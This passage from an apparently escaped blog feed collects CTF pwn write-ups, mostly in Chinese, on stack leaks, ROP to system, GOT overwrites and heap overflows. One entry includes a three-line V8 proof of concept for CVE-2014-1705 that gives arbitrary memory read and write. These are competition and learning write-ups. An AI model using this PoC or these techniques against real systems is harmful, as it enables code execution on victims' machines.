+&lt;li&gt;&lt;code&gt;iload&lt;/code&gt; 得到 libc address  &lt;/li&gt;
+&lt;li&gt;利用 &lt;code&gt;sipush&lt;/code&gt;、&lt;code&gt;iadd&lt;/code&gt;、&lt;code&gt;isub&lt;/code&gt; 等做運算得到 &lt;code&gt;system&lt;/code&gt;、&lt;code&gt;/bin/sh&lt;/code&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;istore&lt;/code&gt; 改寫 ret address 以及參數  &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;istore&lt;/code&gt; 將被更動的 stack guard 寫回  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;經過這題才發現自己的思維很狹隘&lt;br&gt;
+執著於過去學到的 rop 走入誤區&lt;br&gt;
+一直想著如何 leak address&lt;br&gt;
+卻沒想到可以利用 java 本身做運算&lt;br&gt;
+紀錄此篇 write up&lt;br&gt;
+希望以後不會犯下同樣的錯誤  &lt;/p&gt;</content><category term="Other CTF"></category><category term="VM Executable"></category></entry><entry><title>CSAW CTF 2014 pwn 300 ish</title><link href="https://ddaa.tw/csawctf_pwn_300_ish.html" rel="alternate"></link><published>2014-09-23T09:23:00+08:00</published><updated>2014-09-23T09:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-09-23:/csawctf_pwn_300_ish.html</id><summary type="html">&lt;p&gt;接觸 CTF 一年整了...&lt;br&gt;
+好像進步很多 卻又好像什麼都一樣 (嘆&lt;br&gt;
+最後 400 分體力不支了&lt;br&gt;
+隔天才解出有點可惜 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;ish&lt;/em&gt; 是一個模擬 shell 的程式&lt;br&gt;
+有以下幾個指令：  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;ls&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;cat&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;ping&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;admin&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;login&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;sleep&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;lotto&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;quote&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;exit&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;把程式都看過一遍以後&lt;br&gt;
+比較可疑的有 &lt;em&gt;cat&lt;/em&gt;、&lt;em&gt;run&lt;/em&gt;、&lt;em&gt;login&lt;/em&gt;、&lt;em&gt;lotto&lt;/em&gt;&lt;br&gt;
+其他都毫無意義  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;cat&lt;/em&gt; 會去開一個檔案&lt;br&gt;
+但是開啟參數有問題&lt;br&gt;
+檔案不存在就會生一個出來...已存在就會回傳錯誤直接 return  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;run&lt;/em&gt; 是把指令切割後&lt;br&gt;
+第一個參數丟到 &lt;code&gt;system&lt;/code&gt; 呼叫&lt;br&gt;
+不過第一個參數一定是 &lt;em&gt;run&lt;/em&gt;...&lt;br&gt;
+依然無法利用  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;login&lt;/em&gt; 會再開一次 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;接觸 CTF 一年整了...&lt;br&gt;
+好像進步很多 卻又好像什麼都一樣 (嘆&lt;br&gt;
+最後 400 分體力不支了&lt;br&gt;
+隔天才解出有點可惜 QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;ish&lt;/em&gt; 是一個模擬 shell 的程式&lt;br&gt;
+有以下幾個指令：  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;ls&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;cat&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;ping&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;admin&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;login&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;sleep&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;lotto&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;quote&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;exit&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;把程式都看過一遍以後&lt;br&gt;
+比較可疑的有 &lt;em&gt;cat&lt;/em&gt;、&lt;em&gt;run&lt;/em&gt;、&lt;em&gt;login&lt;/em&gt;、&lt;em&gt;lotto&lt;/em&gt;&lt;br&gt;
+其他都毫無意義  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;cat&lt;/em&gt; 會去開一個檔案&lt;br&gt;
+但是開啟參數有問題&lt;br&gt;
+檔案不存在就會生一個出來...已存在就會回傳錯誤直接 return  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;run&lt;/em&gt; 是把指令切割後&lt;br&gt;
+第一個參數丟到 &lt;code&gt;system&lt;/code&gt; 呼叫&lt;br&gt;
+不過第一個參數一定是 &lt;em&gt;run&lt;/em&gt;...&lt;br&gt;
+依然無法利用  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;login&lt;/em&gt; 會再開一次 shell&lt;br&gt;
+檢查帳號是不是 &lt;em&gt;root&lt;/em&gt;&lt;br&gt;
+是的話就會要求密碼&lt;br&gt;
+並從 &lt;em&gt;key&lt;/em&gt; 這個檔案讀 64 byte 後並比對&lt;br&gt;
+但是如果密碼長度超過 64 byte&lt;br&gt;
+&lt;code&gt;memset&lt;/code&gt; 不會被觸發到&lt;br&gt;
+密碼會被留在 stack 中  &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;lotto&lt;/em&gt; 有 &lt;strong&gt;uninitialized varaible&lt;/strong&gt; 造成的 memory leak&lt;br&gt;
+可惜是用 &lt;code&gt;%u&lt;/code&gt; 去印&lt;br&gt;
+沒辦法自由調整位置  &lt;/p&gt;
+&lt;p&gt;這樣看完思路就很明確了&lt;br&gt;
+利用 &lt;em&gt;login&lt;/em&gt; + &lt;em&gt;lotto&lt;/em&gt; 去 leak 出 flag&lt;br&gt;
+而且出題者還很好心在這兩個 function 一開始 print 出 variable 的位置 = =  &lt;/p&gt;
+&lt;p&gt;雖然很快就找到方向&lt;br&gt;
+這題還是卡了一段時間.....&lt;br&gt;
+如果照正常的順序開一個 shell 再執行 &lt;code&gt;lotto&lt;/code&gt;&lt;br&gt;
+能 leak 的位置剛好在 &lt;code&gt;flag[64]&lt;/code&gt; 結束&lt;br&gt;
+剛好是 &lt;strong&gt;stack guard&lt;/strong&gt; ...&lt;br&gt;
+試了各種指令的組合也沒辦法調整 &lt;code&gt;esp&lt;/code&gt;&lt;br&gt;
+一度以為這題是 bof = =  &lt;/p&gt;
+&lt;p&gt;最後逐步比對 assembly&lt;br&gt;
+才發現問題出在 &lt;em&gt;alloca&lt;/em&gt; 這個 function&lt;br&gt;
+一開始以為這個指令是和 &lt;code&gt;malloc&lt;/code&gt; 類似&lt;br&gt;
+但 &lt;code&gt;alloca&lt;/code&gt; 是會在 stack 中把 esp 的位置向上拉來增加空間&lt;br&gt;
+再把新的 esp 回傳&lt;br&gt;
+因此可以利用這個指令來調整 &lt;em&gt;lotto&lt;/em&gt; 所 leak 出的位置  &lt;/p&gt;
+&lt;p&gt;所以只要透過調整 &lt;code&gt;uname&lt;/code&gt; 的長度來控制 stack&lt;br&gt;
+就可以 leak &lt;em&gt;lotto&lt;/em&gt; 之前的任意 address 了&lt;br&gt;
+觸發順序如下:  &lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;em&gt;login with short uname&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;login with root&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;exit&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;login with long uname&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;lotto&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;flag: &lt;code&gt;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOXX&lt;/code&gt;  &lt;/p&gt;</content><category term="CSAWCTF"></category><category term="Uninitialized"></category></entry><entry><title>HITCON CTF 2014 pwn 150 rsbo</title><link href="https://ddaa.tw/hitcon_pwn_150_rsbo.html" rel="alternate"></link><published>2014-08-18T23:01:00+08:00</published><updated>2014-08-18T23:01:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-08-18:/hitcon_pwn_150_rsbo.html</id><summary type="html">&lt;p&gt;這題是 32 bit 的 elf&lt;br&gt;
+程式規模很小&lt;br&gt;
+很容易就看完了  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;試一下超長字串就發現程式會 crash&lt;br&gt;
+仔細看是因為 &lt;code&gt;read_80_bytes()&lt;/code&gt; buffer overflow&lt;br&gt;
+buffer 長度 80 實際讀入 0x80 ...&lt;br&gt;
+我一開始的確沒注意 XDD  &lt;/p&gt;
+&lt;p&gt;crash 的原因是因為 ret 被蓋掉&lt;br&gt;
+蓋完 ret 以後還有 16 byte 的長度可以利用&lt;br&gt;
+這題有 dep + ASLR 的保護&lt;br&gt;
+所以沒辦法知道要跳到哪&lt;br&gt;
+此外，輸入的內容會隨機被打亂&lt;br&gt;
+我們沒辦法讓 ret 正確變成我們希望的內容  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;size = read_80_bytes(buf);
+for ( i = 0; i &amp;lt; size; ++i )
+{
+    v3 …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題是 32 bit 的 elf&lt;br&gt;
+程式規模很小&lt;br&gt;
+很容易就看完了  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;試一下超長字串就發現程式會 crash&lt;br&gt;
+仔細看是因為 &lt;code&gt;read_80_bytes()&lt;/code&gt; buffer overflow&lt;br&gt;
+buffer 長度 80 實際讀入 0x80 ...&lt;br&gt;
+我一開始的確沒注意 XDD  &lt;/p&gt;
+&lt;p&gt;crash 的原因是因為 ret 被蓋掉&lt;br&gt;
+蓋完 ret 以後還有 16 byte 的長度可以利用&lt;br&gt;
+這題有 dep + ASLR 的保護&lt;br&gt;
+所以沒辦法知道要跳到哪&lt;br&gt;
+此外，輸入的內容會隨機被打亂&lt;br&gt;
+我們沒辦法讓 ret 正確變成我們希望的內容  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;size = read_80_bytes(buf);
+for ( i = 0; i &amp;lt; size; ++i )
+{
+    v3 = rand();
+    v7 = v3 % (i + 1);
+  v6 = buf[i];
+  buf[i] = buf[v3 % (i + 1)];
+  buf[v7] = v6;
+}
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;前面還有一個 &lt;code&gt;init()&lt;/code&gt; 去讀 flag 並隨機做 xor 後當成 rand seed&lt;br&gt;
+不過最後計算過程中的 buf 會被清空&lt;br&gt;
+完全無法利用  &lt;/p&gt;
+&lt;p&gt;後來無意間發現 &lt;code&gt;size&lt;/code&gt; 和 &lt;code&gt;i&lt;/code&gt; 的值會被覆蓋&lt;br&gt;
+但是有做初始化所以用不上&lt;br&gt;
+可是如果我們將所有 buffer 都塞成 &lt;code&gt;\x00&lt;/code&gt; 會發生什麼事呢?&lt;br&gt;
+如果在交換過程中 &lt;code&gt;size&lt;/code&gt; 與其他 byte 做交換&lt;br&gt;
+只要 &lt;code&gt;size&lt;/code&gt; 所代表的 4 個 byte 都被換掉&lt;br&gt;
+&lt;code&gt;size&lt;/code&gt; 的值就會變成 0&lt;br&gt;
+迴圈因此中止&lt;br&gt;
+扣掉 &lt;code&gt;size&lt;/code&gt; 和 &lt;code&gt;i&lt;/code&gt; 以後&lt;br&gt;
+因此我們會有 20 byte 可以利用&lt;br&gt;
+此時就可以開始利用 ROP 做點事情  &lt;/p&gt;
+&lt;p&gt;如果沒有 ASLR 的保護我們可以直接透過 &lt;code&gt;return to libc&lt;/code&gt; 去拿到 shell&lt;br&gt;
+&lt;strong&gt;可惜世界上總是很多事情沒有如果...&lt;/strong&gt;&lt;br&gt;
+所以我們必須先想辦法讓程式 memory leak&lt;br&gt;
+這樣一來 20 byte 就完全不夠用了...&lt;br&gt;
+所以我們可以 ret 到 &lt;code&gt;read_80_bytes&lt;/code&gt; 來讀取更多的內容&lt;br&gt;
+不直接跳到 &lt;code&gt;read&lt;/code&gt; 是為了省下參數空間  &lt;/p&gt;
+&lt;p&gt;btw, 因為暫存的 &lt;code&gt;ebp&lt;/code&gt; 會被覆蓋&lt;br&gt;
+執行到 &lt;code&gt;leave&lt;/code&gt; 時會改變 &lt;code&gt;esp&lt;/code&gt;&lt;br&gt;
+在讀完額外的 80 byte 時&lt;br&gt;
+我們將內容讀到 bss segment 上&lt;br&gt;
+並且將 &lt;code&gt;ebp&lt;/code&gt; 蓋成 bss 的位置&lt;br&gt;
+第二階段的 rop chain 都改放在 bss 上  &lt;/p&gt;
+&lt;p&gt;最後只要隨便找個 got 上有的 function&lt;br&gt;
+把內容改成 &lt;code&gt;system&lt;/code&gt; 的位置&lt;br&gt;
+在 cat flag 就得到結果了  &lt;/p&gt;
+&lt;p&gt;flag: &lt;code&gt;HITCON{Y0ur rand0m pay1oad s33ms w0rk, 1uckv 9uy}&lt;/code&gt;&lt;/p&gt;</content><category term="HITCON CTF"></category><category term="Stack Overflow"></category></entry><entry><title>Pwnium CTF 2014 pwn 200 Be a robot</title><link href="https://ddaa.tw/pwnium_pwn_200_be_a_robot.html" rel="alternate"></link><published>2014-07-11T22:59:00+08:00</published><updated>2014-07-11T22:59:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-07-11:/pwnium_pwn_200_be_a_robot.html</id><summary type="html">&lt;p&gt;Pwnium CTF....but there is only one pwn problem. lol&lt;br&gt;
+(pwn100 was down.)  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The problem gave us a host that we can login by ssh and do something.&lt;br&gt;
+Our goal is using the executable named &lt;code&gt;pwn200&lt;/code&gt; to get the content of file named &lt;code&gt;flag&lt;/code&gt; under the same directory.  &lt;/p&gt;
+&lt;p&gt;After using …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Pwnium CTF....but there is only one pwn problem. lol&lt;br&gt;
+(pwn100 was down.)  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The problem gave us a host that we can login by ssh and do something.&lt;br&gt;
+Our goal is using the executable named &lt;code&gt;pwn200&lt;/code&gt; to get the content of file named &lt;code&gt;flag&lt;/code&gt; under the same directory.  &lt;/p&gt;
+&lt;p&gt;After using IDA to reverse the elf, we can find the vulnerability is in the fucntion &lt;code&gt;atExit()&lt;/code&gt;.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="kr"&gt;__cdecl&lt;/span&gt; &lt;span class="nf"&gt;atExit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;signed&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// [sp+Ch] [bp-Ch]@0&lt;/span&gt;
+
+  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;){&lt;/span&gt;
+      &lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;kid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+      &lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;adult&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;v2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;man&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="p"&gt;}&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;If we input a negative number, the elf won't initialize the variable &lt;code&gt;v2&lt;/code&gt;.&lt;br&gt;
+Therefore, we can control eax and execute arbitrary code.  &lt;/p&gt;
+&lt;p&gt;We can't jump to shellcode easily because of ASLR protection.&lt;br&gt;
+However, the program provide a magic function &lt;code&gt;test()&lt;/code&gt; which call &lt;code&gt;system()&lt;/code&gt; and just print &lt;code&gt;hacked&lt;/code&gt;.&lt;br&gt;
+We can use ROP to do something to read flag.&lt;br&gt;
+With no difficulty, I found the ROP chain to call system and controll &lt;code&gt;esp&lt;/code&gt; to change the argument.&lt;br&gt;
+But where can I put the command to get flag ? I stuck in tis problem for a while.&lt;br&gt;
+Finally, I used the environment variable to solve the problem.&lt;br&gt;
+Set an environment variable as &lt;code&gt;cat flag&lt;/code&gt; with a lot of blanks. Like that:  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;DDAA=" "*130000 + "cat flag"&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Then we can guess the address of our environment variable. &lt;br&gt;
+It must be between &lt;code&gt;cat&lt;/code&gt; and &lt;code&gt;=&lt;/code&gt;.&lt;br&gt;
+Once it was right in our guess, we can see the flag of pwn200.  &lt;/p&gt;</content><category term="Other CTF"></category><category term="Uninitialized"></category></entry><entry><title>Secuinside ctf 2014 pwn 300 yet-another-javascript-jail</title><link href="https://ddaa.tw/secuinside_pwn_300_yet_another_js_jail.html" rel="alternate"></link><published>2014-06-06T03:33:00+08:00</published><updated>2014-06-06T03:33:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-06-06:/secuinside_pwn_300_yet_another_js_jail.html</id><summary type="html">&lt;p&gt;這題沒解出來 QQ&lt;br&gt;
+找錯 CVE 真是太囧了&lt;br&gt;
+如果找對個應該是有機會可以解出來吧...  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是一個 javascipt 的 jail 環境&lt;br&gt;
+可以任意執行一些 js 的指令&lt;br&gt;
+part1 dm4 秒殺了 XD&lt;br&gt;
+做法是 overwrite &lt;code&gt;Array.prototype.toString&lt;/code&gt;&lt;br&gt;
+過 part1 以後得到一個 elf&lt;br&gt;
+不看還好...reverse 以後嚇一跳&lt;br&gt;
+根本就是一個 v8 engine = =  &lt;/p&gt;
+&lt;p&gt;比對 &lt;code&gt;RunShell()&lt;/code&gt; 和 example code 以後&lt;br&gt;
+沒看到什麼能利用的地方&lt;br&gt;
+初步判定洞是在 v8 裡面&lt;br&gt;
+而且上一題的 jsjail 版本比較新&lt;br&gt;
+就猜這題的解法應該跟 cve 有關&lt;br&gt;
+結果找錯個 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題沒解出來 QQ&lt;br&gt;
+找錯 CVE 真是太囧了&lt;br&gt;
+如果找對個應該是有機會可以解出來吧...  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這題是一個 javascipt 的 jail 環境&lt;br&gt;
+可以任意執行一些 js 的指令&lt;br&gt;
+part1 dm4 秒殺了 XD&lt;br&gt;
+做法是 overwrite &lt;code&gt;Array.prototype.toString&lt;/code&gt;&lt;br&gt;
+過 part1 以後得到一個 elf&lt;br&gt;
+不看還好...reverse 以後嚇一跳&lt;br&gt;
+根本就是一個 v8 engine = =  &lt;/p&gt;
+&lt;p&gt;比對 &lt;code&gt;RunShell()&lt;/code&gt; 和 example code 以後&lt;br&gt;
+沒看到什麼能利用的地方&lt;br&gt;
+初步判定洞是在 v8 裡面&lt;br&gt;
+而且上一題的 jsjail 版本比較新&lt;br&gt;
+就猜這題的解法應該跟 cve 有關&lt;br&gt;
+結果找錯個 e04...&lt;br&gt;
+[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1705]&lt;br&gt;
+這個才是正確的 = =&lt;br&gt;
+被分類在 chrome 裡面 之前用 v8 下去找沒看到&lt;br&gt;
+這是一個可以任意讀寫記憶體位置的漏洞&lt;br&gt;
+&lt;a href="https://code.google.com/p/v8/source/browse/branches/3.24/test/mjsunit/regress/regress-crbug-351787.js"&gt;poc&lt;/a&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;var ab4 = new ArrayBuffer(8);
+ab4.__defineGetter__(&amp;quot;byteLength&amp;quot;, function() { return 0xFFFFFFFC; });
+var aaaa = new Uint32Array(ab4);
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;關鍵代碼是這三行&lt;br&gt;
+執行這三行以後就可以透過 &lt;code&gt;aaaa&lt;/code&gt; 的 pointer 去任意讀寫 memory&lt;br&gt;
+原理我實在是找不到說明 也 trace 不出來 Orz&lt;br&gt;
+不負責任猜測是將 array 的長度設成超大  &lt;/p&gt;
+&lt;p&gt;執行 poc 後在 &lt;code&gt;ExecuteString()&lt;/code&gt; 的地方確認 memory 的狀態&lt;br&gt;
+會發現 heap 中有大量的區塊都被改成 &lt;code&gt;aaaaaaaa&lt;/code&gt;&lt;br&gt;
+一直往上爬就可以推算出 &lt;code&gt;aaaa&lt;/code&gt; 的 pointer 位於 &lt;code&gt;0x09196eb8&lt;/code&gt;&lt;br&gt;
+所以我們透過 &lt;code&gt;aaaa[i] = 0xAAAAAAAA&lt;/code&gt; 的方式就可以改寫記憶體了&lt;br&gt;
+但是要 overwrite 哪裡 ... ?&lt;br&gt;
+仔細觀察後發現讀取指令的部分是利用 &lt;code&gt;fgets()&lt;/code&gt; 去得到 input&lt;br&gt;
+got table 也是可以被 overwrite 的區域&lt;br&gt;
+因此目標應該就是將 &lt;code&gt;fgets()&lt;/code&gt; 換成我們要的區域了&lt;br&gt;
+(不過在這邊我沒有看到 system() 之類的 function 好利用...)&lt;br&gt;
+(別人的 write up 寫有 system 可以跳)&lt;br&gt;
+(在想是否因為題目環境是 ubuntu 14.04 的關係...)  &lt;/p&gt;
+&lt;p&gt;but &lt;code&gt;fget()&lt;/code&gt; 在 got table 的位置是 &lt;code&gt;0x091680a8&lt;/code&gt;&lt;br&gt;
+欸...嘗試一下 index 好像不能用負數&lt;br&gt;
+這樣豈不是改不到嗎...?&lt;br&gt;
+卡關很久才發現這邊有 interger overflow 的情況&lt;br&gt;
+這邊取得 dst pointer 的做法是 &lt;code&gt;*aaaa + index*4&lt;/code&gt;&lt;br&gt;
+因此只要 index 夠大&lt;br&gt;
+就會被當成負數做判斷&lt;br&gt;
+如此一來就能任意跳轉記憶體位置了  &lt;/p&gt;
+&lt;p&gt;btw 聽說這個 cve 是 tomcr00se 舉報的 XDDD  &lt;/p&gt;</content><category term="Other CTF"></category><category term="CVE"></category></entry><entry><title>DEF CON 22 CTF Quals Baby's First heap</title><link href="https://ddaa.tw/defcon_pwn_baby_first_heap.html" rel="alternate"></link><published>2014-05-20T01:31:00+08:00</published><updated>2014-05-20T01:31:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-05-20:/defcon_pwn_baby_first_heap.html</id><summary type="html">&lt;p&gt;這題是第一天在看的&lt;br&gt;
+在嘗試做 payload 時 &lt;strong&gt;jeffxx&lt;/strong&gt; 就解完啦 XD&lt;br&gt;
+不過還是厚著臉皮寫一下 write up  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;連上去環境後得到這樣的訊息：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Welcome to your first heap overflow...&lt;br&gt;
+I am going to allocate 20 objects...&lt;br&gt;
+Using Dougle Lee Allocator 2.6.1...&lt;br&gt;
+Goodluck!&lt;br&gt;
+Exit function pointer is at 804C8AC address.&lt;br&gt;
+[ALLOC][loc=9DE4008][size=1246]&lt;br&gt;
+[ALLOC][loc=9DE44F0][size=1121]&lt;br&gt;
+...&lt;br&gt;
+Write …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這題是第一天在看的&lt;br&gt;
+在嘗試做 payload 時 &lt;strong&gt;jeffxx&lt;/strong&gt; 就解完啦 XD&lt;br&gt;
+不過還是厚著臉皮寫一下 write up  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;連上去環境後得到這樣的訊息：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Welcome to your first heap overflow...&lt;br&gt;
+I am going to allocate 20 objects...&lt;br&gt;
+Using Dougle Lee Allocator 2.6.1...&lt;br&gt;
+Goodluck!&lt;br&gt;
+Exit function pointer is at 804C8AC address.&lt;br&gt;
+[ALLOC][loc=9DE4008][size=1246]&lt;br&gt;
+[ALLOC][loc=9DE44F0][size=1121]&lt;br&gt;
+...&lt;br&gt;
+Write to object [size=260]:&lt;br&gt;
+123&lt;br&gt;
+Copied 4 bytes.&lt;br&gt;
+[FREE][address=9DE4008]&lt;br&gt;
+[FREE][address=9DE44F0]&lt;br&gt;
+...&lt;br&gt;
+[FREE][address=9DE84B0]&lt;br&gt;
+Did you forget to read the flag with your shellcode?&lt;br&gt;
+Exiting  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;好像就只是個簡單的 heap overflow ?&lt;br&gt;
+一開始以為要用舊的環境才能測&lt;br&gt;
+就用 2.6.32 在 debug&lt;br&gt;
+後來發現 &lt;code&gt;free()&lt;/code&gt; 好像是程式自帶的&lt;br&gt;
+我在 3.8.0-29 測試也沒問題&lt;br&gt;
+(有錯請告知 QQ)  &lt;/p&gt;
+&lt;p&gt;這題會 allocate 20 次空間&lt;br&gt;
+接著讓我們輸入一個字串&lt;br&gt;
+把字串 copy 到 第 10 個空間&lt;br&gt;
+再把 20 個空間給 free&lt;br&gt;
+隨便輸入一下 發現 &amp;gt;=260 個 byte 就會 crash&lt;br&gt;
+直接開 gdb 去看原因&lt;br&gt;
+是死在這一行  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x80493f6 &amp;lt;free+273&amp;gt;:        mov    DWORD PTR [eax+0x8],ed
+eax            0x61616161  
+edx            0x61616161  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;看起來這邊可以任意寫入記憶體&lt;br&gt;
+嘗試一下把題目的 &lt;code&gt;exit_func&lt;/code&gt; 改掉  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x80493ff &amp;lt;free+282&amp;gt;:        mov    DWORD PTR [eax+0x4],edx
+eax            0x61616161
+edx            0x804c8a4 
+x/xw 0x804c8ac
+0x804c8ac &amp;lt;exit_func&amp;gt;:  0x61616161
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;喔喔 成功改掉了 但是依然 crash&lt;br&gt;
+所以要 jmp 的位置也要可寫入才行&lt;br&gt;
+不過 heap 本來就能寫所以沒啥問題&lt;br&gt;
+就正式來一次吧  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x80493f6 &amp;lt;free+273&amp;gt;:        mov    DWORD PTR [eax+0x8],edx
+eax            0x0
+edx            0x0
+0x804c8ac &amp;lt;exit_func&amp;gt;:  0x0804f350
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;WTF? 還是 crash&lt;br&gt;
